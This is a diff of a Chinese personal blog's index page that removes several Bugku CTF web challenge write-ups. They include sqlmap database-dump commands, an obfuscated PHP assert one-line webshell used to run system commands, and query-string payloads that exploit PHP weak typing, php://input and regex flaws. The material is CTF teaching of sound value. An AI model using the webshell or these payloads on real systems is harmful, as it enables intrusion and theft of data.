-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>我不管别人如何手注，反正我就用sqlmap了</p>
-<p>python sqlmap.py -l C:\Users\S\Desktop\123</p>
-<p>python sqlmap.py -l C:\Users\S\Desktop\123 –dbs</p>
-<p>python sqlmap.py -l C:\Users\S\Desktop\123 -D skctf –dump-all</p>
-<p>得到flag</p>
-<img src="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/1.PNG" class="" title="1.PNG">
-<p>这题有些flag和题目对不上，骗金币<br>话是这么说，但这些话也是在我学完所有注入以后的想法，对没学过的甚至找不到一个靠谱的temper的人来说，手注依然非常重要</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-shell/">bugku-web-shell</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-shell/" class="archive-article-date">
-  	<time datetime="2021-08-09T12:26:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>看提示——送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</p>
-<p>简单来讲就是assert($_GET[‘s’])</p>
-<p>assert函数会把里面的内容当成php代码执行</p>
-<p>所以直接传值：s=system(“ls”)<br>发现目录</p>
-<img src="/2021/08/09/bugku-web-shell/1.PNG" class="" title="1.PNG">
-
-<p>然后传：s=system(“cat flaga15808abee46a1d5.txt”)<br>得到flag</p>
-<img src="/2021/08/09/bugku-web-shell/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-shell/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-never-give-up" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-never-give-up/">bugku-web-never_give_up</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-never-give-up/" class="archive-article-date">
-  	<time datetime="2021-08-09T12:05:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>查看源代码，发现1p.html<br>访问1p.html，发现直接重定向到了论坛。</p>
-<p>改为bp抓包，拦截让页面卡在跳转页面<br>查看源代码，发现一些url代码</p>
-<img src="/2021/08/09/bugku-web-never-give-up/1.PNG" class="" title="1.PNG">
-
-<p>拿到bp里解码（强烈建议bp加码，方便解这种套娃）<br>连续进行url，base64，url解码后得到一段并不完整的php代码</p>
-<img src="/2021/08/09/bugku-web-never-give-up/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/09/bugku-web-never-give-up/3.PNG" class="" title="3.PNG">
-<img src="/2021/08/09/bugku-web-never-give-up/4.PNG" class="" title="4.PNG">
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))&#x2F;&#x2F;参数a中不能带.字符</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;读取参数a的文件内容并赋值给data</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#x2F;&#x2F;data等于&quot;bugku is a nice plateform!&quot;，id等于0，b的长度要大于5，“111”连接b的第0个字符要等于&quot;1114&quot;，b的第0个字符要不等于4</span><br><span class="line">&#123;</span><br><span class="line">	$flag &#x3D; &quot;flag&#123;***********&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/OHuooo/p/14670610.html">https://www.cnblogs.com/OHuooo/p/14670610.html</a></p>
-<p>首先是id<br>这里用到的是PHP中的0e绕过，由于PHP是弱类型语言，在数字开头的字符串与数字进行弱类型比较==时，会用第一个非数字之前的字符转化成数字后与数字进行比较。</p>
-<p>题目中要求id不能为0或者false，同时id==0，因此可以使用弱类型绕过。让id=0e123456</p>
-<p>关于a<br>这里使用php伪协议，绕过file_get_contents()函数，所以a=php://input，然后使用POST方法传递bugku is a nice plateform!即可</p>
-<p>关于b<br>题中要求b的第0个字符不为4，但是又要求第0个字符与”111”拼接之后弱等于”1114”。</p>
-<p>这里应该联想到正则表达式，让b以通配符*开头，且长度大于5</p>
-<p>所以可以让b=*123456</p>
-<img src="/2021/08/09/bugku-web-never-give-up/5.PNG" class="" title="5.PNG">
-<p>得到flag</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-never-give-up/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-cookies" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-cookies/">bugku-web-cookies</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-cookies/" class="archive-article-date">
-  	<time datetime="2021-08-09T10:14:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后抓包<img src="/2021/08/09/bugku-web-cookies/1.PNG" class="" title="1.PNG"><br>把filename解码发现是keys.txt<br>试着把index.php用base64加密后放进去，改line的数值，发现从3开始有内容<br>出来，逐个复制出来是一个php代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;       </span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>当cookie中的margin参数的值为margin时，就可以访问keys.php，所以在cookie加一个margin=margin<br>，然后把上面的文件名换成keys.php的base64加密形式a2V5cy5waHA=</p>
-<p>得到flag</p>
-<img src="/2021/08/09/bugku-web-cookies/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-cookies/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-No-one-knows-regex-better-than-me" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">bugku-web-No one knows regex better than me</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/" class="archive-article-date">
-  	<time datetime="2021-08-09T09:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">$zero&#x3D;$_REQUEST[&#39;zero&#39;];</span><br><span class="line">$first&#x3D;$_REQUEST[&#39;first&#39;];</span><br><span class="line">$second&#x3D;$zero.$first;</span><br><span class="line">if(preg_match_all(&quot;&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;i&quot;,$second))&#123;</span><br><span class="line">    $key&#x3D;$second;</span><br><span class="line">    if(preg_match(&quot;&#x2F;\.\.|flag&#x2F;&quot;,$key))&#123;</span><br><span class="line">        die(&quot;Noooood hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $third&#x3D;$first;</span><br><span class="line">        if(preg_match(&quot;&#x2F;\\|\056\160\150\x70&#x2F;i&quot;,$third))&#123;</span><br><span class="line">            $end&#x3D;substr($third,5);</span><br><span class="line">            highlight_file(base64_decode($zero).$end);&#x2F;&#x2F;maybe flag in flag.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最大的难点在<code>preg_match(&quot;/\\|\056\160\150\x70/i&quot;,$third)</code>这句，因为php会自动把所有带<code>\</code>的转译，并且会转译到不能转移为止，所以这句话实际上是<code>preg_match(&quot;|.php/i&quot;,$third)</code></p>
-<p>这里构造payload我就直接利用他给的<code>|.php</code>构造了，所以为了绕过<code>substr($third,5)</code>,要在前面补四个字母，不能是flag所以只能选“girl”<br>所以前面就补一个base64加密后的“flag”，为ZmxhZw==<br>所以最后的payload为：?zero=ZmxhZw==&amp;first=girl|.php<br>得到flag</p>
-<img src="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/1.PNG" class="" title="1.PNG">
-
-<p>也可以把后面的全部消除掉，那么base64加密的就是flag.php（ZmxhZy5waHA=，因为正好有a，所以可以绕过上面的验证）<br>payload为：?zero=ZmxhZy5waHA=&amp;first=|.php</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/bugku-web-No-one-knows-regex-better-than-me/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
-    </nav>
-  
-
-
           </div>
         </div>
       </div>
@@ -1159,8 +433,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
